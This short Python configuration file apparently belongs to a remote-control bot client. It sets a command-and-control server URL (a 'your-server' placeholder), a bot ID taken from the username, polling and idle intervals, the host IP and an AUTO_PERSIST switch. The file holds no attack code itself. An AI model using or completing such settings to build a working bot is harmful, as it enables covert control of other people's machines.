import os
import socket

SERVER_URL = "http://your-server:8080"
BOT_ID = os.getenv("username")
DEBUG = False
IDLE_TIME = 120
REQUEST_INTERVAL = 2
PAUSE_AT_START = 1
AUTO_PERSIST = True
BOT_IP = socket.gethostbyname(socket.gethostname())
